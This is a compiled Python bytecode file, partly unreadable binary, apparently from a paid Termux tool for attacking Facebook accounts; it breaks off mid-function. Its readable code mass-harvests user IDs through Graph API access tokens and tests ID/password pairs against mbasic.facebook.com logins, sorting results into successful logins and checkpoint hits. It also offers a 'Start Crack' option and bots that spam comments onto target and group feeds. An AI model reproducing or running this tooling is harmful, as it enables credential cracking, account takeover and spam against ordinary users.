a
    ��4aq� �                
   @   sl  e d � z edd��� aedd��� ZW n   dadZY n0 zddlT W n^ ey� Z zFe ed e	 d e d e	 d	e  �f e
�d
� e�  W Y dZ[n
dZ[0 0 z$e�d�j�� Ze�d�j�� ZW n� ejj�y   e�d� e ed � ej��  Y n` e�yd Z zFe ed e	 d e d e	 d	e  �f e
�d
� e�  W Y dZ[n
dZ[0 0 dZdZe� Ze� Ze� Ze� ZdZdZ e� Z!dZ"dZ#dZ$dZ%dZ&dZ'dZ(dZ)dZ*dZ+dZ,dZ-dZ.dZ/dZ0dZ1d Z2d!Z3d"Z4d#Z5d$Z6d%Z7e'e- Z8d&Z	d'Z9d(Z:d)Zd*Z0d+Z;d(Z<ed e	 d e d, e	 Z=ed e	 d- e d, e	 Zed e	 d. e d, e	 Z>ed e	 d/ e d, e	 Z?ed e	 d0 e d, e	 Z@ed e	 d1 e d, e	 ZAdZBg aCg aDg aEdaFdaGdaHdaId2ZJd3d4� ZKeLeM�N� �Od5��ZPeLeM�N� �Od5��ZQeRjSZTeRjUZVeRjWZXeM�N� ZRz�e�d6�j�� ZYe�d7�j�� ZZeQeZk�r\e[�  e��  zheYd8v �r�e ed9 �f e
�d
� n@e\�  e ed: e] eY � e ed; e1 e^ � e ed< � e�  W n* e_e`f�y�   e ed= � e�  Y n0 W n* e_e`f�y   e ed= � e�  Y n0 d>d?� Zad@dA� ZbdBdC� ZcdDdE� ZddFdG� ZedHdI� ZfdJdK� ZgdLdM� ZhdNdO� ZidPdQ� ZjdRdS� ZkdTdU� ZldVdW� ZmdXdY� ZndZd[� Zod\d]� Zpd^d_� Zqd`da� Zrdbdc� Zsddde� Ztdfdg� Zudhdi� Zvdjdk� Zwdldm� Zxdndo� Zydpdq� Zzdrds� Z{dtdu� Z|dvdw� Z}dxdy� Z~dzd{� Zd|d}� Z�d~dd�ed�d�d�d��a�d�d�� Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�G d�d�� d��Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�d��Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d�d��Z�d�d�� Z�d�d�� Z�d�d�� Z�d�d Z�d�dĄ Z�d�dƄ Z�d�dȄ Z�d�dʄ Z�d�d̄ Z�e�d�k�rhe�ej��d�k�rRej�d
 d�k�r:e�d� eb�  e��dϡZ�e�D ]"Z�d�e� Z�e ed� e1 e� � �q�e�d�e d� e] �Z�zee�d���� Z�W n0 e��y.   e ed� � e
�dΡ e�  Y n0 e}e�� ne ed� � ee>d� � e�dס e��  es�  dS )�z1[!] Wait a moment... Checking Network and License�	ua_me.txt�r��Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36�    )�*�[�   •�]� Error : %s�   Nz!https://pastebin.com/raw/RkReZuwKzBhttps://github.com/TEAM-TERMUX-INDONESIA/DATA-FILE/blob/main/Memek�clearzYour Network Doesn t Exist Zdjahdhfgzvxbcnvmalrpeuqisjz
06-09-2021zIyhaa Jarr (Jarr)z
31-08-2021z
31-10-2021z[00mz[40mz[44mz[46mz[42mz[45mz[41mz[47mz[43mz[0;94m�[0;92mz[0;96m�[0;91mz[0;95mz[0;93mz[0;97mz[0;90mz[0;33mz[0;31mz[0;32mz[0;36mz[0;34mz[0;35m�] �!�?�   ••z!!z??�https://mbasic.facebook.comc                 C   s   dt | � d S )Nz[1;�m)�str)Zcol� r   �2/data/data/com.termux/files/home/premium/premv2.py�<lambda>\   �    r   z%d-%m-%Yz!https://pastebin.com/raw/exzCY7sMz!https://pastebin.com/raw/SNHmCTDF)zMR.RISKYZDownzServer Saat Ini AktifzServer Used : zAdmin Set Date : z0Server Currently Maintenance.. Contact Author !!z#Please Check Your Internet Network c                 C   s   t �| � d S �N)�os�system)Zdumr   r   r   �bash�   s    r   c                   C   s
   t �  d S r   )�bannerr   r   r   r   �logo�   s    r   c                 C   s2   | d D ]$}t j�|� t j��  t�d� qd S )N�
g{�G�z�?)�sys�stdout�write�flush�time�sleep)�z�er   r   r   �jalan�   s    
r(   c                  C   s^   zt dd��� } W n, ty>   t�d� t�d� t�  Y n0 tj�d�rTt�  nt�  d S )N�.premr   r   �rm -rf .prem)	�open�read�IOErrorr   r   �romz�path�exists�cekprem��toketr   r   r   �license�   s    

r4   c                  C   s^   zt dd��� } W n, ty>   t�d� t�d� t�  Y n0 tj�d�rTt�  nt�  d S )N�.adminr   r   �rm -rf .admin)	r+   r,   r-   r   r   �romz1r/   r0   �cekadminr2   r   r   r   �license2�   s    

r9   c               	   C   s|  t �d� t�  t�t� �j�� } z�tt	d t
 �}t|�dk rnt|dv rRt	d nt	d � t�d� t�  q4t�t� �j�� } || v r�t�  |}tdt	 d	 t
 d
 � tdd�}|�|� |��  t�  n(t�  tdt	 d	 t d � t �d� W n~ tjj�y0   t �d� tt	d � t j��  Y nH t�yL   t j��  Y n, ttf�yv   t�d� t j��  Y n0 d S )Nr   zKode Premium : �#   �� � �License Can't Be Empty !!�&Key/License Must Be More Than 35 Words�   r   �Status Premium : �   ✓r)   �w�Xr*   �Tidak Ada Jaringan !!r
   )r   r   r   �requests�get�Link_Premium�text�strip�input�war�i�lenr(   r$   r%   r.   �kntl�printr+   r"   �close�exitr   �
exceptions�ConnectionErrorr    �KeyboardInterrupt�KeyErrorr-   ��rr�lZ	kata_premZidqr   r   r   r.   �   s<    





r.   c               	   C   s�  t �d� t�  t�t� �j�� } z�tt	d t
 �}t|�dk rnt|dv rRt	d nt	d � t�d� t�  q4t�t� �j�� } || v r�t�  |}tdt	 d	 t
 d
 � tdd�}|�|� |��  t�  n.t�  tdt	 d	 t d � t �d� t�  W n~ tjj�y6   t �d� tt	d � t j��  Y nH t�yR   t j��  Y n, ttf�y|   t�d� t j��  Y n0 d S )Nr   zKode Administrasi : r:   r;   r>   r?   r@   r   �Status Administrasi : rB   r5   rC   rD   r6   rE   r
   )r   r   r   rF   rG   �
Link_AdminrI   rJ   rK   rL   rM   rN   r(   r$   r%   r7   rO   rP   r+   r"   rQ   rR   r   rS   rT   r    rU   rV   r-   rW   r   r   r   r7   �   s>    







r7   c               �   C   s�  t �d� t�  t�t� �j�� } �z�tdd��	� }t
|�dk rxt|dv rRtd ntd � t�d� t �d	� t�  q4t�t� �j�� } || v �r�td
t d t d � tdd��	� }| �|d �}|d � }|�d�}|d � }dt|� }ttd t t � ttd t | � t�d� t|k�rt �d	� td
t d � tt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� d t� d!t� d"t� d#t� dt� d$t� d%t� dt� d$t� d&t� dt� d$t� d't� dt� d(t� dt� d)t� d!t� d*t� d+t� d,t� d-t� d.t� d/t� d0t� d.t� d1t� d2t� d3t� d4t� d.t� d5t� d+t� d6t� d-t� d.t� d/t� d0t� d.t� d7t� d8t� d3t� d4t� d3t� d9t� d3t� d:t� d.t� d;t� ��� t�  n.td
t d t d< � t �d	� ttd= � W n~ tjj�yP   t �d� ttd> � t j ��  Y nH t!�yl   t j ��  Y n, t"t#f�y�   t�d� t j ��  Y n0 d S )?Nr   r)   r   r:   r;   r>   r?   r@   r*   r   rA   rB   �|r
   �<r   �%s�Tanggal Now     : �Tanggal Expired : �      �?�0Sorry Your Key/License Has Expired... Or Expired�(Social Accounts And Whatsapp Numbers :

�	Whatsapp �:� +6283143565470 �(�Mr.Risky�)
�	Telegram �	Facebook � m.facebook.com/llovexnxx �Risky�)

�!Author Uses 4 Payment Methods :

�DANA  � 083143565470
�OVO   �GOPAY �PULSA � 083143565470 �AXIS�Key/License Price :

�--- �Key Premium
�	1 Minggu �=�
 Rp10.000
�	1 Bulan  �
 Rp25.000
�2 Bulan �+� Bot Follow �	 30.000

�
Key Admin
�
 Rp30.000
�3 Bulan �
 Bot Like � Bot Share Posts in Profile �	 Rp40.000rD   z Sorry you are not a premium user�#Sorry Your Network Doesn t Exist !!)$r   r   r   rF   rG   rH   rI   rJ   r+   r,   rN   r(   rL   r$   r%   rR   rP   rM   �splitr   �I�waktu�C�P�K�U�B�M�qr   rS   rT   r    rU   rV   r-   �rX   rY   �titidZlonjaZpelerZ	tanggalxdZhgfr   r   r   r1   �   sP   









������������������
���������������
�������������������������������


r1   c               �   C   s�  t �d� t�  t�t� �j�� } �z�tdd��	� }t
|�dk rxt|dv rRtd ntd � t�d� t �d	� t�  q4t�t� �j�� } || v �r�td
t d t d � tdd��	� }| �|d �}|d � }|�d�}|d � }dt|� }ttd t t � ttd t | � t�d� t|k�rt �d	� td
t d � tt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� dt� d t� d!t� d"t� d#t� dt� d$t� d%t� dt� d$t� d&t� dt� d$t� d't� dt� d(t� dt� d)t� d!t� d*t� d+t� d,t� d-t� d.t� d/t� d0t� d.t� d1t� d2t� d3t� d4t� d.t� d5t� d+t� d6t� d-t� d.t� d/t� d0t� d.t� d7t� d8t� d3t� d4t� d3t� d9t� d3t� d:t� d.t� d;t� ��� t�  n.td
t d t d< � t �d	� ttd= � W n~ tjj�yP   t �d� ttd> � t j ��  Y nH t!�yl   t j ��  Y n, t"t#f�y�   t�d� t j ��  Y n0 d S )?Nr   r5   r   r:   r;   r>   r?   r@   r6   r   rZ   rB   r\   r
   r]   r   r^   r_   r`   ra   rb   rc   rd   re   rf   rg   rh   ri   rj   rk   rl   rm   rn   ro   rp   rq   rr   rs   rt   ru   rv   rw   rx   ry   rz   r{   r|   r}   r~   r   r�   r�   r�   r�   r�   r�   r�   r�   r�   rD   z Sorry You Are Not Administrationr�   )$r   r   r   rF   rG   r[   rI   rJ   r+   r,   rN   r(   rL   r$   r%   rR   rP   rM   r�   r   r�   r�   r�   r�   r�   r�   r�   r�   r�   r   rS   rT   r    rU   rV   r-   r�   r   r   r   r8   &  sP   









������������������
���������������
�������������������������������


r8   c               
   C   sR  t j�d�rt�  t� d�} n
t� d�} t j�d�rFt�  t� d�}n
t� d�}t �d� td t	 d t d }td t	 d	 t d }t
�  ttd
 t	 d �t�d�f ttd |  d | �t�d�f tdt d t d t d t d t d t	 d t d � ttd t d t d t d t d t	 d t d � ttd t d t d t d t d t	 d t d � ttd t d t d t d | � ttd t d t d t d | � ttd t d t d t d | � ttd t d t d t d  | d � �z�| t� d�fv �rސz4|t� d�fv �rNttd! �}|d"v �r�ttd# � t�d$� t�  n�|d%v �r�t�  t�  n�|d&v �r�t�  n�|d'v �r�t�  t�  n||d(v �r�t�  t�  nd|d)v �r�t�  t�  nL|d*v �rt�  t�  n4|d+v �r.t�  t�  nttd# � t�d$� t�  �n(z�ttd! �}|d"v �r�ttd# � t�d$� t�  n�|d%v �r�t�  t�  nv|d&v �r�t�  nd|d'v �r�t�  t�  nL|d*v �r�t�  t�  n4|d+v �r�t�  t�  nttd# � t�d$� t�  W n` t�yt } zFttd t d, t d t d-|  �f t�d.� t�  W Y d }~n
d }~0 0 W n` t�y� } zFttd t d, t d t d-|  �f t�d.� t�  W Y d }~n
d }~0 0 �nz�|t� d�fv �rtttd! �}|d"v �r&ttd# � t�d$� t�  nL|d(v �r>t�  t�  n4|d)v �rVt�  t�  nttd# � t�d$� t�  nttd/ � t�  W n` t�y� } zFttd t d, t d t d-|  �f t�d.� t�  W Y d }~n
d }~0 0 W n` t�yL } zFttd t d, t d t d-|  �f t�d.� t�  W Y d }~n
d }~0 0 d S )0Nr)   �Yes�Notr5   r   rg   ZPremium�)ZAdminzNama Pembeli/Donasi  : u   –g
ףp=
�?zStatus Premium/Admin : �/皙�����?r   r   �1r   z Check Option Sensi Akun �2z Get Ttl Masal From File �3z Checkpoint Detector From File �4z# Dump ID Follow Masal (max-500000) �5z Dump Amount Of Friends �6z% Old or Young Facebook ID Separation �7z Facebook bots zPilih : r;   zIsi Dengan Benar !!�   �r�   �01�r�   �02�r�   �03�r�   �04�r�   Z05�r�   �06�r�   �07r   r	   r
   zBack To Menu)r   r/   r0   r4   rM   r   r9   r   r�   r�   r   rP   rL   r$   r%   �k�prK   �inp�menuvvip�
buatngecekrR   Z	pemisahxx�
Login_userZdump_all�
checkteman�oldid�menu_bot�	Exception�menu)Z	prem_stasZ
admin_stasZqqwZqwwZdmr'   r   r   r   r�   j  s�    




"@<<(((,



















4 4 





4 4r�   c               
   C   s�  t td t �} z tdd��� }tdd��� }W n^ ty� } zFttd t d t d t d|  �f t	�
d� t�  W Y d }~n
d }~0 0 t�d	|  d
 | �}t�|j�}�z�d�dd�}t|d�}g }|d D ]<}	|	d }
|	d }|�|
d | � |�|
d | d � q�|��  dtt|�� }ttd t tt|�� � |dv �rXt�d	|  d | �}t�|j�}z�d�dd�}t|d�}g }|d D ]>}|d }|d }|�|d | � |�|d | d � �q�|��  dtt|�� }ttd t tt|�� d � |dv �r*ttd � nt|� W n  t�yT   ttd � Y n0 nt|� W n  t�y�   ttd � Y n0 d S )NzId Target : �	login.txtr   r   r   r   r	   r
   �https://graph.facebook.com/�/friends?access_token=z.lppr=   �_rC   �data�id�name�<=>r   r^   z Total Facebook Accounts Public: )�00�0�%/subscribers?limit=5000&access_token=z!Total Facebook Accounts Follow : z

)r�   r�   zSorry No ID !!)rK   r�   r�   r+   r,   r�   rP   r�   r�   r$   r%   �logsrF   rG   �json�loadsrI   �replace�appendr"   rQ   r   rN   rL   rR   �pepekxarV   )�idtr3   �tokenr'   r   r&   ZqqqZyssr�   rM   �uid�naZtmenrX   �zzZqqqqZysssZidx�iiZuidd�nanZfllowr   r   r   r�   �  sX    4


 
r�   c              
   C   s�   z�t | ��� �� }tdd��b}z.|D ]$}|�d�}|�t|d |d � q$W n" ttfyn   t	t
d � Y n0 W d   � n1 s�0    Y  W n" ttfy�   t	t
d � Y n0 d S )N�
   �Zmax_workersr�   r   r
   zDone...zFile Tidak Tersedia !!)r+   r,   �
splitlines�ThreadPoolExecutorr�   �submit�	kontolkaurV   r-   rR   rL   )�file�	list_akun�su�akunr   r   r   r�     s    
4r�   c              
   C   sH  z t dd��� }t dd��� }W n^ ty~ } zFttd t d t d t d|  �f t�d� t�  W Y d }~n
d }~0 0 z.t	�
d| |f �}t�|j�}|d	 d
 }W n ttfy�   d}Y n0 z�t	�
d|  d | �}t�|j�}	g }
|	d D ]4}|d }|d }|�d�d }|
�|d | � q�dtt|
�� }td7 aW n   Y n0 zfttd t ttt�� t d t d t |  t d t t|� t d t | �t�d�f W n� t�y�   ttd � t�  Y n` t�yB } zFttd t d t d t d|  �f t�d� t�  W Y d }~n
d }~0 0 d S )Nr�   r   r   r   r   r	   r
   �9https://graph.facebook.com/%s/subscribers?access_token=%s�summary�total_countr�   r�   �'/subscribers?limit=999999&access_token=r�   r�   r�   r=   r   r\   r^   �ID : �
 Follow : �
 Friend : r�   zBack !!)r+   r,   r�   rP   r�   r�   r$   r%   r�   rF   rG   r�   r�   rI   rV   r-   �rsplitr�   r   rN   �jqr�   �intr�   rU   rK   r�   r�   rR   �r�   r�   r3   r�   r'   r   r&   �pengikutrX   r�   r�   r�   r�   r�   �nmZbhr   r   r   r�     sB    4
f
4r�   c              
   C   s�  z t dd��� }t dd��� }W n^ ty~ } zFttd t d t d t d|  �f t�d� t�  W Y d }~n
d }~0 0 z.t	�
d| |f �}t�|j�}|d	 d
 }W n ttfy�   d}Y n0 z�t	�
d|  d | �}t�|j�}	g }
|	d D ]4}|d }|d }|�d�d }|
�|d | � q�dtt|
�� }td7 aW n   Y n0 z\ttd t ttt�� t d t d t |  t d t t|� t d t | � W n   Y n0 d S )Nr�   r   r   r   r   r	   r
   r�   r�   r�   r�   r�   r�   r�   r�   r�   r=   r   r\   r^   z    [r�   r�   r�   )r+   r,   r�   rP   r�   r�   r$   r%   r�   rF   rG   r�   r�   rI   rV   r-   r�   r�   r   rN   r�   r�   r�   r�   r�   r   r   r   �cek_epepA  s8    4
\r�   c               
   C   s.  zt dd��� } W n^ typ } zFttd t d t d t d|  �f t�d� t�  W Y d }~n
d }~0 0 t	�
d�}|D ] }d	| }ttd
 t | � q�tdt d t �}zt |d��� }W n. ty�   ttd � t�d� t�  Y n0 ttd t tt|�� � ttt d � |D ]�}|�dd�}|�d�}z0|d � }	t�d|	 d |  �}
t�|
j�}W n   Y n0 z|d }W n ttf�y�   d}Y n0 ttd t | d | � zt|d |d � W n tj j!�y�   Y �q(Y n0 ttd t" d t d � �q(tt� d�� d S )Nr�   r   r   r   r   r	   r
   ZHasilzHasil/zAvailable Files !!: r   �File Name : �File Not Foundr�   zTotal Akun : z2==================================================r<   r\   r   r�   �?access_token=�birthdayr=   zSedang Check ID : z Selesai...)#r+   r,   r�   rP   r�   r�   r$   r%   r�   r   �listdir�bulatrM   rK   rL   �	readlines�FileNotFoundErrorrR   �ur   rN   �cr�   r�   rF   rG   r�   r�   rI   rV   r-   �check_inrS   rT   r   )r3   r'   �dirsr�   �files�	buka_baju�memek�kontolr�   r�   �jok�op�ttllr   r   r   r�   _  sL    4




 r�   c                 C   sV  d}t �� }|j�dddtd|dddd	d
dtd ddd�� i }t|jtd d|id�jd�}|�dddi�}g d�}|�	d�D ]0}|�d�|v r�|�|�d�|�d�i� q�q�q�|�| |d�� z&t|j
t|�d� |dd�jd�}	W n$ tjj�y   ttd � Y n0 d|jv �r.ttt d  � �n$d!|jv �r�|	�d�}
|
�ddd"i�d }|
�ddd#i�d }|
�ddd$i�d }||||d%d&|d'�}t|j
t|
d  |d(�jd�}d)d*� |�	d+�D �}tt|��D ]$}td,t|d- �d. ||  � �q�nXd/t|	�v �r:|	�d0d1d/i��d0�j}td,t d2 t | � ntd,t d2 t d3 � d S )4Nr   �mbasic.facebook.com�	max-age=0r�   �!application/x-www-form-urlencoded�|text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zmark.via.gpzsame-originZnavigatez?1Zdocument�/login/?next&ref=dbl&fl&refid=8�gzip, deflate�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7)�Host�cache-control�upgrade-insecure-requests�origin�content-type�
user-agent�acceptzx-requested-withzsec-fetch-sitezsec-fetch-modezsec-fetch-userzsec-fetch-dest�referer�accept-encoding�accept-languager
  ��headers�html.parser�form�method�post)Zlsd�jazoestZm_tsZliZ
try_numberZunrecognized_tries�loginZbi_xrwhrK   r�   �value��email�pass�actionT�r�   Zallow_redirectszExcess Problem�c_userz!This Account Doesn't Check Points�
checkpoint�fb_dtsgr  �nhr<   Z	Lanjutkan)r  r  r  r  Zcheckpoint_datazsubmit[Continue]r   �r�   c                 S   s   g | ]
}|j �qS r   )rI   )�.0Zyyr   r   r   �
<listcomp>�  r   zcheck_in.<locals>.<listcomp>Zoptionz   r
   z. Zlogin_errorZdivr�   z NOTE : z ID And Password Broken Or Failed)rF   �Sessionr  �update�mbZparrG   rI   �find�find_allr  r   rS   �TooManyRedirectsrP   rL   �cookiesr�   �rangerN   r   r   r�   )r�   �pw�uaZsesr�   ZgedZfm�listrM   �runr  ZdtsgZjzstr   ZdataDZxnxxZngewZoptZohr   r   r   r�   �  sn    �&
�	$r�   c                  C   sZ  t dt d t �} zt| d��� }W n. tyT   ttd � t�d� t	�  Y n0 |D ]�}|�
dd�}z,|�d�}|d � }|d � }|d	 � }W n   Y n0 zPtd
 t d t d t }td
 t d t d t }	t�||||	|g�}
W n   Y n0 |
|	k�rtd	7 antd	7 azt|
| d | � W qZ   Y qZY qZ0 qZt	td � d S )Nr   �File Name   : r   r�   r�   r<   r\   r   r
   r   �CPr   �OKzDone ..)rK   rL   rM   r+   r�   r�   rP   r$   r%   rR   r�   r�   r�   r�   r�   �random�choice�bf�bg)r�   r�   r�   r�   rO   �idn�bodatr�   ZcpxZokxZggr   r   r   �fake�  s8    





r9  c                  C   sB  t dt d t �} zt| d��� }W n. tyT   ttd � t�d� t	�  Y n0 t td t �}|dv rvt
�  n t td t d	 t d
 t d t �}|dv r�d}n |D �]~}|�dd�}z,|�|�}|d � }|d � }|d � }	W n   Y n0 z|�d�}
W n   Y n0 z|�d�}W n   Y n0 znd|
d � �}
tt|
 t d t d t d t d � td| d d�}|�|
| |	 d � |��  W n   Y n0 znd|d � �}tt| t d t d t d t d � td| d d�}|�|| |	 d � |��  W q�   Y q�Y q�0 q�t	td � d S )Nr   r0  r   r�   r�   zSeparator Type : r;   z	Save Filez (zdump/??z): ZAnjayr<   r   r
   Z00000Z0000Z100000z   Already old rg   z	sudah taur�   �dump/�.json�a+Z10000z	   Young z
masih mudazDone..)rK   rL   rM   r+   r�   r�   rP   r$   r%   rR   r�   r�   r�   r�   r�   r�   r"   rQ   )r�   r�   Zpmm�aswr�   r�   rO   r7  r8  r�   �oldZmdh�ppxr   r   r   r�   �  sV    
(



,,r�   c               
   C   s�  zt �d� W n   Y n0 z<tdd��� } t�d|  �}t�|j�}|d }|d }W n^ t	y� } zFt
td t d t d	 t d
|  �f t�d� t�  W Y d }~n
d }~0 0 t �d� t j�d�r�t�  t� d�}d}nt� d�}d}t j�d��rt�  t� d�}d}	nt� d�}d}	t�d�j}
t�d��� d }t �d� t�  t
td t d t d	 t d | � t
td t d t d	 t d | � t
td t d t d	 t d |
 � t
td t d t d	 t d | � t
td t d t d	 t d | | t � t
td t d t d	 t d |	 | t � t
td t d t d	 t d t t t � t
td t d t d	 t d t t t � t
td t d  t d	 t d! t d" � t
td t d# t d	 t d$ � t
td t d% t d	 t d& � t
td t d' t d	 t d( � t
td t d) t d	 t d* � t
td t d+ t d	 t d, � t
td t d- t d	 t d. � t
td t d/ t d	 | d0 � t
td t d1 t d	 |	 d2 � t
td t d3 t d	 t d4 t d5 t d6 t d7 � t
td t d8 t d	 t d9 t d5 t d: t d7 � t
td t d; t d	 t d< t d5 t d= t d7 � t�  d S )>Nzmkdir Hasilr�   r   �,https://graph.facebook.com/me/?access_token=r�   r�   r   r   r   r	   r
   r   r)   r�   r   r�   r   r5   zhttps://api.ipify.orgzhttp://ip-api.com/json/�country�
[z++z Your Name      : z Your ID        : z Your IP        : z Country        : z Premium        : z Administration : z Last Updated   : z You Join Date  : r   z3===================================================�   ⟩⟩r�   z Dump ID From Public/Friend r�   z Dump ID From Followersr�   z Start Crackr�   z Get Target Informationr�   z View Crack Resultsr�   z Settings User Agent�08z Login User Premium�09z Login User Administrasi�10z Vvip Menu rg   zPay And Freer�   �11z Donasi z
Please bror�   z Logout zREMOVE TOKEN)r   r   r+   r,   rF   rG   r�   r�   rI   r�   rP   r�   r�   r$   r%   r�   r/   r0   r4   rM   r   r9   r   �upda�durasir�   r�   r�   r�   �choose_menu)r3   �otw�a�namar�   r'   Zstatus_premZteszZstatus_adminZteszzZiprA  r   r   r   r�     sh    4





((((0000,$$$$$$$$<<<r�   c                  C   s�  t td t d t d t d �} | dkrZttd t d t d t d � t�  �n8| d	ksj| d
krtt�  �n| dks�| dkr�t�  �n| dks�| dk�r4t�d�}|D ] }d| }tt	d t
 | � q�t dt	 d t �}zt|d��� }W n0 t�y&   tt	d � t�d� t�  Y n0 t|� �n^| dk�sH| dk�rRt�  �n@| dk�sf| dk�rpt�  �n"| dk�s�| dk�r�t�d� t�  n�| dk�s�| dk�r�t�  n�| d k�s�| d!k�r�t�  n�| d"k�r�t�  t�  n�| d#k�rFtt	d$ t d% t
 d& t d' � tt	d( � t�d)� t�d*� t�d)� t�  nL| d+k�rXt�  n:| d,k�rvt�  t td- � ntt	d. � t�d/�t� f d S )0NrB  r   r   �
 Choose : r<   r   r   � Fill In The Correctr�   r�   r�   r�   r�   r�   �dumpr:  �The File Name You Dump : r   r0  r   r�   r�   r�   r�   r�   r�   r�   r�   �rm -rf ua_me.txt�8rD  �9rE  rF  rG  zJust use it, don't donate rg   zGuna Doang Engga Donasir�   z5You Will Be Redirected To Github Author ( READMD.md )g      �?zCxdg-open https://github.com/Dumai-991/Dumai-991/blob/main/README.mdr9  �keyzPress Enter !!zPlease Fill Correctly !!ra   )rK   r�   r�   rP   r�   �public�followr   r�   rL   r�   rM   r+   r�   r�   r$   r%   rR   �
pilihcrack�get_info�ressr   �menu_user_agentr4   r9   r�   r(   r�   r9  �buatkeyr�   )r   r�   r�   �filex�dumair�   r   r   r   rJ  R  sb    $$









$




rJ  c                     s�   dd l � dd l�ttd t �} | dv r:ttd � t�  � �fdd�}tt|d� t d t |  � tt|d� t d t |  � tt|d� t d t |  � d S )	Nr   zEnter Expiry Date : r;   zDon't be empty dearc                    s   d� � �fdd�t| �D ��S )Nr<   c                 3   s   | ]}� � �j�V  qd S r   )r4  Zascii_letters)r"  �x�r3  �stringr   r   �	<genexpr>�  r   z/buatkey.<locals>.random_char.<locals>.<genexpr>)�joinr+  )Zkgr`  r   r   �random_char�  s    zbuatkey.<locals>.random_char�(   r\   )	r3  ra  rK   r�   r�   rP   rL   r\  r�   )Zexpird  r   r`  r   r\  �  s      r\  c                  C   s�   t dt d t d t d t d � t td t d t d t d � t td t d t d t d	 � tdt d
 t �} | dv r�t td �t�d�f t�  nL| dv r�t	�  n<| dv r�t
�  n,| dv r�t�  nt td �t�d�f t�  d S )Nr   r   r�   r   z Bot Komen Post Targetr�   z Bot Komen Post Grup Targetr�   z Check My Group IdzPilih Menu : r;   zFill it Correctlyr
   r�   r�   r�   )rP   r�   r�   rK   rL   r�   r$   r%   r�   �bot_komen_post�
grup_komen�grupsaya)Zajgr   r   r   r�   �  s    ($$r�   c            	      C   s�  g } t �d� ztdd��� }W n4 tyT   td� t �d� t�d� t�  Y n0 t �d� t	�  tt
d t d t d	 � ttd
 t �}ttd t �}ttd t �}|�dd�}�z t�d| d | d | �}t�|j�}tt
t d � |d d D ]r}|d }| �|� t�d| d | d | � tt
t d t d t |d d� �dd� d t d � �qtt
t d � tdt
 d tt| �� � tdt
 d � t�  W n6 t�y�   tt
d  � tdt
 d! � t�  Y n0 d S )"N�resetr�   r   z[1;91m[!] Token not found�rm -rf login.txtr
   �Use Words *�@�* For New Lines�ID Target : �
Comment : �Limit : r   r�   �?fields=feed.limit(�)&access_token=�*==========================================�feedr�   r�   �/comments?message=�&access_token=�Done r   �   r=   �... r   ��Done... �Back..zID Failed...�Back...)r   r   r+   r,   r-   rP   r$   r%   r�   r   r�   r�   r�   rK   rL   r�   rF   rG   r�   r�   rI   r�   r  r   rN   r�   rV   )	Zkomenr3   �ide�km�limitr�   rL  �s�fr   r   r   rf  �  sB    




@
rf  c                  C   sv  g } t �d� ztdd��� }W n8 tyX   ttd � t �d� t�d� t	�  Y n0 t �d� t
�  ttd t d t d	 � ttd
 t �}ttd t �}ttd t �}|�dd�}z>t�d| d | �}t�|j�}ttd t |d  � W n6 t�y6   ttd � tdt d � t�  Y n0 �z t�d| d | d | �}t�|j�}ttt d � |d d D ]r}	|	d }
| �|
� t�d|
 d | d | � ttt d t d t |d d� �dd � d! t d" � �q�ttt d � td#t d$ tt| �� � tdt d% � t�  W n6 t�yp   ttd& � tdt d � t�  Y n0 d S )'Nri  r�   r   �Token not foundrj  r
   rk  rl  rm  rn  ro  rp  r   z%https://graph.facebook.com/group/?id=rv  zName Grup : r�   zGroup ID Not Foundr}  z https://graph.facebook.com/v3.0/rq  rr  rs  rt  r�   r�   r�   ru  rw  r   �   r=   ry  r   rz  r{  r|  zProblem Not Found...)r   r   r+   r,   r-   rP   rL   r$   r%   r�   r   r�   r�   r�   rK   r�   rF   rG   r�   r�   rI   rV   r�   r�   r  r   rN   )Z	komengrupr3   r~  r  r�  r   r=  r�   rL  r�  r�  r   r   r   rg  �  sR    




@
rg  c               	   C   sP  g } t �d� ztdd��� }W n8 tyX   ttd � t �d� t�d� t	�  Y n0 zt �
d� W n tyz   Y n0 t �d� t�  z�t�d| �}t�|j�}|d	 D ]p}|d
 }|d }tdd�}| �|| � |�|d | d � ttd t t|� t d t t|� t� q�|��  ttt d � ttd t dt| �  � ttd t d � tdt d � t�  W n� ttf�y�   tdt d � t�  Y n� t �y�   t �!d� ttd � tdt d � t�  Y n^ tj"j#�y   ttd � t$�  Y n6 t�yJ   ttd � tdt d � t�  Y n0 d S )Nri  r�   r   r�  rj  r
   rP  z2https://graph.facebook.com/me/groups?access_token=r�   r�   r�   zdump/GrupCheck.txtrC   r=   r   zNama Grup : z   ID Grup : rs  zGroup Total : r^   zList Save : r|  z
Stop !!...zGroup not foundzNo Connection�Error)%r   r   r+   r,   r-   rP   r�   r$   r%   r�   �mkdir�OSErrorr   rF   rG   r�   r�   rI   r�   r"   rL   r�   r   r�   �m3r�   rQ   rN   rK   r�   rU   �EOFErrorrV   �removerS   rT   rR   )Zlistgrupr3   ZuhZgudr�   rM  r�   r�  r   r   r   rh  �  s\    




0




rh  c            D      C   sN  z t dd��� } t dd��� }W nF tyf   ttd t d t d t d � t�d� t�  Y n0 g }�
zftdt	 d	 � t
td
 t �}|dv r�tt	d � t�d� t�  t
td t �}t
td t �}t
td t �}t
td t �}t
td t �}t
td t �}	t
td t �}
t
td t �}t
td t �}t
